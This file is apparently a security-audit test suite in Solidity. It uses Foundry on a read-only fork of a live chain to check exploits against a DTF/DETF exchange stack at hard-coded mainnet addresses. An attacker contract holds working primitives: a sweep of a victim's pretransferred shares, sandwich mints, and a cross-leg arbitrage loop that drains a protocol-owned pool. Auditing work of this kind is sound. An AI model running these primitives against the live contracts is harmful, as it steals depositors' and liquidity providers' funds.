// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {ExchangeInAmount} from "contracts/utils/ExchangeInAmount.sol";
import {IStandardExchangeIn as ExchangeInInterface} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {IERC20 as ExchangeInToken} from "@crane/contracts/interfaces/IERC20.sol";

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

/// Live-variant analysis of the DTF stack on Robinhood mainnet 4663 (deployed PRE-HEAD code).
/// Local fork only (http://127.0.0.1:8545). Nothing is broadcast.

interface IERC20L {
    function balanceOf(address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ISE {
    function exchangeIn(address tokenIn, uint256 amountIn, address tokenOut, uint256 minOut, address to, bool pre, uint256 dl)
        external returns (uint256 amountOut, uint256 amountRefunded);
    function exchangeOut(address tokenIn, uint256 maxIn, address tokenOut, uint256 amountOut, address to, bool pre, uint256 dl)
        external returns (uint256);
    function previewExchangeIn(address tokenIn, uint256 amountIn, address tokenOut) external view returns (uint256 amountOut, uint256 amountRefunded);
    function previewExchangeOut(address tokenIn, address tokenOut, uint256 amountOut) external view returns (uint256);
}

interface IDetfView {
    function syntheticPrice() external view returns (uint256);
    function isMintingAllowed(address) external view returns (bool);
}

interface IRegistryDisable {
    function isDisabled(address) external view returns (bool);
    function setVaultAddressDisabled(address vault, bool disabled) external returns (bool);
    function owner() external view returns (address);
}

address constant CUSTODY = 0x2E9C1F705aB967c5Af59249203d7495bDabb223b; // RebasingAware SE (wDTF)
address constant LIQ_SE = 0x999DaE02D22E5FEe1c4508430D5196d31d631009; // UniV4 SE WETH/DTF (disabled)
address constant HOOK = 0x46E068c2393e189Fbc86632f67210aF253a42Aa8; // weighted buffer hook
address constant DETF = 0x4a5cFDC2b07016FCf917f4eD5A51C52111A0fcC7;
address constant DTF = 0xeE5576Fa1Bcaa380e591D01245f406f3f384eb01;
address constant WETH = 0x0Bd7D308f8E1639FAb988df18A8011f41EAcAD73;
address constant REGISTRY = 0x09682b00D873D913ada0bB69B4D4c9631810d0bc;

/// Unprivileged attacker contract (bytecode caller).
contract Actor {
    function dl() internal view returns (uint256) { return block.timestamp + 1 hours; }

    function approveAll() external {
        IERC20L(DTF).approve(HOOK, type(uint256).max);
        IERC20L(DTF).approve(DETF, type(uint256).max);
        IERC20L(DTF).approve(CUSTODY, type(uint256).max);
        IERC20L(DETF).approve(HOOK, type(uint256).max);
        IERC20L(WETH).approve(HOOK, type(uint256).max);
        IERC20L(WETH).approve(DETF, type(uint256).max);
        IERC20L(WETH).approve(LIQ_SE, type(uint256).max);
        IERC20L(DTF).approve(LIQ_SE, type(uint256).max);
    }

    // ---- APEX-003 sweep primitive on the live custody vault ----
    function sweep(uint256 minBurn) external returns (uint256 shares, uint256 assets) {ISE(CUSTODY).exchangeIn(CUSTODY, minBurn, DTF, 0, address(this), true, dl());
        shares = IERC20L(CUSTODY).balanceOf(address(this));(assets,) = ISE(CUSTODY).exchangeIn(CUSTODY, shares, DTF, 0, address(this), false, dl());
    }

    // ---- DETF mint helpers ----
    function mintDetf(uint256 dtfIn) public returns (uint256) {(uint256 quotedAmountOut,) = ISE(DETF).exchangeIn(DTF, dtfIn, DETF, 0, address(this), false, dl());
    return quotedAmountOut;
    }

    function sellDetf(uint256 amt) public returns (uint256) {
        if (amt == 0) return 0;(uint256 quotedAmountOut,) = ISE(HOOK).exchangeIn(DETF, amt, DTF, 0, address(this), false, dl());
        return quotedAmountOut;
    }

    /// detf-spot-mint, same-leg variant (the only leg live): dump d DETF -> mint with m DTF -> buy back d -> sell surplus.
    function sandwichMint(uint256 d, uint256 m) external returns (uint256 minted) {
        uint256 detf0 = IERC20L(DETF).balanceOf(address(this));if (d > 0) ISE(HOOK).exchangeIn(DETF, d, DTF, 0, address(this), false, dl());
        minted = mintDetf(m);
        if (d > 0) ISE(HOOK).exchangeOut(DTF, type(uint256).max, DETF, d, address(this), false, dl());
        uint256 detf1 = IERC20L(DETF).balanceOf(address(this));
        require(detf1 >= detf0, "detf short");
        sellDetf(detf1 - detf0);
    }

    /// Full atomic cycle, DTF-only in and out: acquire d DETF by minting, k x (dump d, mint m, buy back d), sell all DETF.
    function fullCycle(uint256 d, uint256 m, uint256 k, uint256 chunk) external returns (int256 pnl) {
        uint256 t0 = IERC20L(DTF).balanceOf(address(this));
        require(IERC20L(DETF).balanceOf(address(this)) == 0, "start flat");
        while (IERC20L(DETF).balanceOf(address(this)) < d) mintDetf(chunk);
        uint256 inv = IERC20L(DETF).balanceOf(address(this));
        for (uint256 i; i < k; ++i) {ISE(HOOK).exchangeIn(DETF, inv, DTF, 0, address(this), false, dl());
            mintDetf(m);
            ISE(HOOK).exchangeOut(DTF, type(uint256).max, DETF, inv, address(this), false, dl());
        }
        // liquidate everything in MaxInRatio-safe pieces
        uint256 bal = IERC20L(DETF).balanceOf(address(this));
        while (bal > 0) {
            uint256 hb = IERC20L(DETF).balanceOf(HOOK);
            uint256 piece = bal > hb / 5 ? hb / 5 : bal;
            sellDetf(piece);
            bal = IERC20L(DETF).balanceOf(address(this));
        }
        pnl = int256(IERC20L(DTF).balanceOf(address(this))) - int256(t0);
    }

    // ---- WETH-leg probes ----
    function hookWethToDetf(uint256 w) external returns (uint256) {(uint256 quotedAmountOut,) = ISE(HOOK).exchangeIn(WETH, w, DETF, 0, address(this), false, dl());
    return quotedAmountOut;
    }

    function hookDetfToWeth(uint256 a) external returns (uint256) {(uint256 quotedAmountOut,) = ISE(HOOK).exchangeIn(DETF, a, WETH, 0, address(this), false, dl());
    return quotedAmountOut;
    }

    function detfMintWithWeth(uint256 w) external returns (uint256) {(uint256 quotedAmountOut,) = ISE(DETF).exchangeIn(WETH, w, DETF, 0, address(this), false, dl());
    return quotedAmountOut;
    }

    /// What-if loop after re-enable: WETH -> DETF (hook) -> DTF (hook) -> WETH (liquidity SE swap).
    function crossLegArb(uint256 w) external returns (uint256 wethOut) {(uint256 e,) = ISE(HOOK).exchangeIn(WETH, w, DETF, 0, address(this), false, dl());(uint256 t,) = ISE(HOOK).exchangeIn(DETF, e, DTF, 0, address(this), false, dl());(wethOut,) = ISE(LIQ_SE).exchangeIn(DTF, t, WETH, 0, address(this), false, dl());
    }
}

contract LiveDtfStackTest is Test {
    Actor attacker;
    uint256 constant MIN_BURN = 1e11; // smallest share burn with non-zero asset output (~1e10 shares per DTF wei)

    function setUp() public {
        // The shared anvil on 127.0.0.1:8545 is pinned at 94071615, which is past the upstream
        // (non-archive, ~5-8k block) state window, so every uncached account read fails. Fork the
        // public RPC at its tip instead (read-only; forge never broadcasts).
        vm.createSelectFork(vm.envOr("LIVE_FORK_URL", string("https://rpc.mainnet.chain.robinhood.com")));
        attacker = new Actor();
        attacker.approveAll();
        console2.log("block", block.number);
    }

    function _hookBook() internal view returns (uint256 dtfLegDtf, uint256 detfBal, uint256 liqShares) {
        dtfLegDtf = IERC20L(DTF).balanceOf(CUSTODY);
        detfBal = IERC20L(DETF).balanceOf(HOOK);
        liqShares = IERC20L(LIQ_SE).balanceOf(HOOK);
    }

    // =========================================================================================
    // A. APEX-003 / prepaid-credit-refund-sweep root cause on the LIVE custody vault (pre-HEAD).
    //    Live exposure today = custody self-share balance (0). Victim is a hypothetical honest
    //    two-step integrator set up before the attack.
    // =========================================================================================
    function test_A_custodyRestingShareSweep_live() public {
        console2.log("custody self-share balance (live exposure)", IERC20L(CUSTODY).balanceOf(CUSTODY));
        address victim = makeAddr("victim");
        uint256 dep = 1_000_000e18; // 1M DTF (~0.07 WETH)
        deal(DTF, victim, dep);
        vm.startPrank(victim);
        IERC20L(DTF).approve(CUSTODY, dep);(uint256 shares,) = ISE(CUSTODY).exchangeIn(DTF, dep, CUSTODY, 0, victim, false, block.timestamp + 1);
        IERC20L(CUSTODY).transfer(CUSTODY, shares); // tx1 of an intended 2-step pretransferred redeem
        vm.stopPrank();

        (uint256 hookDtfBefore,,) = _hookBook();
        uint256 hookSharesBefore = IERC20L(CUSTODY).balanceOf(HOOK);
        uint256 a0 = IERC20L(DTF).balanceOf(address(attacker));
        (uint256 sw, uint256 assets) = attacker.sweep(MIN_BURN);
        uint256 profit = IERC20L(DTF).balanceOf(address(attacker)) - a0;
        console2.log("victim deposit DTF", dep);
        console2.log("attacker swept shares", sw);
        console2.log("attacker DTF profit (capital 0)", profit);
        assertGt(profit, dep * 999 / 1000, "attacker takes ~all resting value");
        assertEq(IERC20L(CUSTODY).balanceOf(victim), 0, "victim loses pretransferred shares");
        assertEq(IERC20L(CUSTODY).balanceOf(HOOK), hookSharesBefore, "LP (hook) untouched");
        assertEq(IERC20L(DTF).balanceOf(CUSTODY) + profit + 0, hookDtfBefore + 0, "vault backing for hook unchanged");
        assets;
    }

    // =========================================================================================
    // B. WETH leg of the DETF stack is frozen by the kill switch on 0x999DaE02:
    //    - detf-spot-mint (3rd-leg dump), hunt-weighted-hook-forces-pons-blocked-mint,
    //      hunt-detf-entry-no-unlock-gate all need this leg -> unreachable live.
    // =========================================================================================
    function test_B_wethLegFrozen_live() public {
        assertTrue(IRegistryDisable(REGISTRY).isDisabled(LIQ_SE), "liquidity SE disabled");
        console2.log("hook preview 0.01 WETH->DETF", ExchangeInAmount.previewOut(ExchangeInInterface(address(ISE(HOOK))), ExchangeInToken(address(WETH)), 1e16, ExchangeInToken(address(DETF))));
        console2.log("detf preview 0.01 WETH->DETF", ExchangeInAmount.previewOut(ExchangeInInterface(address(ISE(DETF))), ExchangeInToken(address(WETH)), 1e16, ExchangeInToken(address(DETF))));
        deal(WETH, address(attacker), 1e18);
        deal(DTF, address(attacker), 50_000_000e18);
        attacker.mintDetf(1_000_000e18);
        uint256 e = IERC20L(DETF).balanceOf(address(attacker));
        assertGt(e, 0);

        try attacker.hookWethToDetf(1e16) returns (uint256) { revert("WETH->DETF hook swap succeeded"); }
        catch (bytes memory r) { console2.log("hook WETH->DETF reverts, sel:"); console2.logBytes(r); }
        try attacker.hookDetfToWeth(e) returns (uint256) { revert("DETF->WETH hook swap succeeded"); }
        catch (bytes memory r) { console2.log("hook DETF->WETH reverts, sel:"); console2.logBytes(r); }
        try attacker.detfMintWithWeth(1e16) returns (uint256) { revert("DETF mint with WETH succeeded"); }
        catch (bytes memory r) { console2.log("DETF mint(WETH) reverts, sel:"); console2.logBytes(r); }
    }

    // =========================================================================================
    // C. detf-spot-mint (P3 confirmed on 3-leg fixture) on the only tradable live leg (DTF).
    //    Attacker capital: DTF (dealt, valued at market) + d DETF acquired honestly by minting in setup.
    //    PnL measured in DTF with DETF inventory restored exactly. Control = same mint, no sandwich.
    // =========================================================================================
    function _runC(uint256 d, uint256 m) internal returns (int256 pnlAttack, int256 pnlControl) {
        deal(DTF, address(attacker), 2_000_000_000e18 / 10); // 200M DTF capital
        // honest acquisition of DETF inventory d (setup): mint until >= d
        while (IERC20L(DETF).balanceOf(address(attacker)) < d) attacker.mintDetf(2_000_000e18);
        uint256 extra = IERC20L(DETF).balanceOf(address(attacker)) - d;
        if (extra > 0) attacker.sellDetf(extra);
        assertEq(IERC20L(DETF).balanceOf(address(attacker)), d);

        uint256 snap = vm.snapshotState();
        uint256 t0 = IERC20L(DTF).balanceOf(address(attacker));
        attacker.sandwichMint(0, m);
        pnlControl = int256(IERC20L(DTF).balanceOf(address(attacker))) - int256(t0);
        vm.revertToState(snap);

        t0 = IERC20L(DTF).balanceOf(address(attacker));(uint256 spot0,) = ISE(HOOK).previewExchangeIn(DETF, d == 0 ? 1e9 : d, DTF);
        attacker.sandwichMint(d, m);(uint256 spot1,) = ISE(HOOK).previewExchangeIn(DETF, d == 0 ? 1e9 : d, DTF);
        console2.log("  liquidation value of inventory pre (DTF)", spot0);
        console2.log("  liquidation value of inventory post(DTF)", spot1);
        if (d > 0) pnlAttack = pnlAttack - int256(spot0) + int256(spot1);
        pnlAttack += int256(IERC20L(DTF).balanceOf(address(attacker))) - int256(t0);
        assertEq(IERC20L(DETF).balanceOf(address(attacker)), d, "DETF inventory restored");
    }

    function test_C_detfSpotMint_sameLeg_live() public {
        console2.log("syntheticPrice", IDetfView(DETF).syntheticPrice());
        assertTrue(IDetfView(DETF).isMintingAllowed(DTF), "mint gate open on DTF route");
        uint256[3] memory ds = [uint256(0), 1_000e9, 2_000e9];
        uint256[3] memory ms = [uint256(500_000e18), 1_000_000e18, 3_000_000e18];
        bool anyProfit;
        for (uint256 i; i < ds.length; ++i) {
            for (uint256 j; j < ms.length; ++j) {
                uint256 snap = vm.snapshotState();
                (int256 pa, int256 pc) = _runC(ds[i], ms[j]);
                console2.log("d(DETF 1e9)", ds[i] / 1e9, "m(DTF)", ms[j] / 1e18);
                console2.log("  pnl attack incl. inventory revaluation (DTF wei)", pa);
                console2.log("  pnl control(DTF wei)", pc);
                if (pa > 0) anyProfit = true;
                vm.revertToState(snap);
            }
        }
        assertFalse(anyProfit, "same-leg spot-mint sandwich unprofitable live");
    }

    // =========================================================================================
    // F. Full atomic cycle with DTF capital only (no pre-held DETF), ends flat in DETF.
    //    Profit = DTF gained; victim = hook LP (protocol-owned reserve backing DETF) + DETF holders (dilution).
    // =========================================================================================
    function _hookValueDtf(uint256 p0Wad) internal view returns (uint256) {
        // hook DTF leg + DETF leg valued at the PRE-attack hook spot (DTF per DETF, wad-scaled per 1e9 DETF)
        return IERC20L(DTF).balanceOf(CUSTODY) + IERC20L(DETF).balanceOf(HOOK) * p0Wad / 1e9;
    }

    function test_F_detfSpotMint_fullCycle_live() public {
        deal(DTF, address(attacker), 300_000_000e18);// attacker capital (repaid to itself in-tx; PnL net)
        uint256 p0 = ExchangeInAmount.previewOut(ExchangeInInterface(address(ISE(HOOK))), ExchangeInToken(address(DETF)), 1e9, ExchangeInToken(address(DTF))); // marginal DTF per 1 DETF (pre)
        console2.log("pre spot DTF per DETF", p0 / 1e18);
        uint256[2] memory ds = [uint256(1_000e9), 2_000e9];
        uint256[2] memory ms = [uint256(1_000_000e18), 3_000_000e18];
        uint256[3] memory ks = [uint256(0), 1, 3];
        int256 best;
        for (uint256 i; i < 2; ++i) for (uint256 j; j < 2; ++j) for (uint256 q; q < 3; ++q) {
            uint256 snap = vm.snapshotState();
            uint256 v0 = _hookValueDtf(p0);
            uint256 sup0 = IERC20L(DETF).totalSupply();
            try attacker.fullCycle(ds[i], ms[j], ks[q], 2_000_000e18) returns (int256 pnl) {
                console2.log("d", ds[i] / 1e9, "m", ms[j] / 1e18);
                console2.log("  k", ks[q]);
                console2.log("  attacker DTF pnl", pnl);
                console2.log("  hook value delta @p0 (DTF)", int256(_hookValueDtf(p0)) - int256(v0));
                console2.log("  DETF supply delta (1e9)", int256(IERC20L(DETF).totalSupply()) - int256(sup0));
                console2.log("  post spot DTF per DETF", ExchangeInAmount.previewOut(ExchangeInInterface(address(ISE(HOOK))), ExchangeInToken(address(DETF)), 1e9, ExchangeInToken(address(DTF))) / 1e18);
                assertEq(IERC20L(DETF).balanceOf(address(attacker)), 0, "flat DETF");
                if (pnl > best) best = pnl;
            } catch (bytes memory r) {
                console2.log("reverted d/m/k", ds[i] / 1e9, ms[j] / 1e18);
                console2.logBytes(r);
            }
            vm.revertToState(snap);
        }
        console2.log("best attacker DTF pnl", best);
        assertEq(best, 0, "REFUTED: no profitable full cycle (best stays at initial 0)");
    }

    // =========================================================================================
    // D. INFORMATIONAL what-if: owner re-enables 0x999DaE02 (honest admin op, not attacker).
    //    The hook's WETH leg has diverged from market while frozen; quantify the cross-leg arb
    //    available to anyone at the moment of re-enable (loss borne by protocol-owned hook LP).
    // =========================================================================================
    function test_D_reenableCrossLegArb_whatIf() public {
        address owner_ = IRegistryDisable(REGISTRY).owner();
        vm.prank(owner_);
        IRegistryDisable(REGISTRY).setVaultAddressDisabled(LIQ_SE, false);
        assertFalse(IRegistryDisable(REGISTRY).isDisabled(LIQ_SE));
        deal(WETH, address(attacker), 10e18);
        uint256[5] memory ws = [uint256(1e15), 5e15, 2e16, 5e16, 1e17];
        int256 best;
        uint256 bestW;
        for (uint256 i; i < ws.length; ++i) {
            uint256 snap = vm.snapshotState();
            try attacker.crossLegArb(ws[i]) returns (uint256 out) {
                int256 p = int256(out) - int256(ws[i]);
                console2.log("weth in", ws[i], "weth out", out);
                if (p > best) { best = p; bestW = ws[i]; }
            } catch (bytes memory r) {
                console2.log("arb reverted at", ws[i]);
                console2.logBytes(r);
            }
            vm.revertToState(snap);
        }
        console2.log("best profit wei WETH", best);
        console2.log("at input", bestW);
    }

    /// Repeated loops (each leg-size under MaxInRatio) until the next loop is unprofitable: total extractable.
    function _reenable() internal {
        address owner_ = IRegistryDisable(REGISTRY).owner();
        vm.prank(owner_);
        IRegistryDisable(REGISTRY).setVaultAddressDisabled(LIQ_SE, false);
    }

    function _tryArb(uint256 w) internal returns (bool) {
        try attacker.crossLegArb(w) returns (uint256 out) { return out > w + 1e12; } catch { return false; }
    }

    function _loopArb() internal returns (uint256 loops) {
        uint256 w = 0.05e18;
        for (uint256 i; i < 60; ++i) {
            uint256 snap = vm.snapshotState();
            if (_tryArb(w)) { ++loops; continue; }
            vm.revertToState(snap);
            if (w <= 0.002e18) break;
            w = w / 2;
        }
    }

    function _logBook(string memory tag) internal view {
        (uint256 c, uint256 h, uint256 l) = _hookBook();
        console2.log(tag);
        console2.log("  custody DTF", c);
        console2.log("  hook DETF  ", h);
        console2.log("  hook liqSE shares", l);
    }

    /// Repeated loops (each under MaxInRatio) until the next loop is unprofitable: total extractable.
    function test_E_reenableCrossLegArb_total_whatIf() public {
        _reenable();
        uint256 capital = 0.1e18;
        deal(WETH, address(attacker), capital);
        uint256 lpSupply = IERC20L(HOOK).totalSupply();// reviewer: fair (pre-attack) marginal prices, in WETH per 1e18 unit
        uint256 pDtf = ExchangeInAmount.previewOut(ExchangeInInterface(address(ISE(LIQ_SE))), ExchangeInToken(address(DTF)), 1000e18, ExchangeInToken(address(WETH))) * 1e18 / 1000e18;
        uint256 pShr;try ISE(LIQ_SE).previewExchangeIn(LIQ_SE, 1e21, WETH) returns (uint256 o, uint256) { pShr = o * 1e18 / 1e21; } catch {}
        (uint256 c0,, uint256 l0) = _hookBook();
        _logBook("before");
        uint256 loops = _loopArb();
        _logBook("after");
        uint256 fin = IERC20L(WETH).balanceOf(address(attacker));
        console2.log("profitable loops", loops);
        console2.log("attacker WETH start", capital);
        console2.log("attacker WETH end  ", fin);
        assertEq(IERC20L(HOOK).totalSupply(), lpSupply, "no LP minted/burned: loss is to existing hook LP");
        assertEq(IERC20L(DTF).balanceOf(address(attacker)), 0);
        assertEq(IERC20L(DETF).balanceOf(address(attacker)), 0);
        assertGt(fin, capital, "net WETH profit, no residual inventory");
        (uint256 c1,, uint256 l1) = _hookBook();
        console2.log("pre-attack WETH per 1e18 DTF", pDtf);
        console2.log("pre-attack WETH per 1e18 liqSE share (0 = preview unsupported)", pShr);
        int256 hookDelta = (int256(c1) - int256(c0)) * int256(pDtf) / 1e18 + (int256(l1) - int256(l0)) * int256(pShr) / 1e18;
        console2.log("hook value delta @pre-attack prices (WETH wei)", hookDelta);
        if (pShr > 0) assertLt(hookDelta, 0, "hook reserve loses value at fair prices");
    }
}
